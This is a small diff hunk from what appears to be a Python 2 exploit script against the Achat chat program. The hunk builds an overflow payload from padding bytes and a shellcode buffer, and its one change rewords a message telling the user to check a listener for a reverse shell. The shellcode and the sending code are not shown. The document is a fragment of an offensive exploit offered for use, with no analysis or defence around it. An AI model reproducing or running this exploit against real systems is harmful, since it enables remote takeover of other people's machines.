@@ -93,7 +93,7 @@ p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
 p += buf + "A" * (1152 - len(buf))
 p += "\x00" + "A"*10 + "\x00"
 
-print "Sending exploit to Achat. Check your listener for a reverse shell."
+print "\n[+]Sending exploit to Achat. Check your listener for a reverse shell."
 i=0
 while i<len(p):
     if i > 172000:
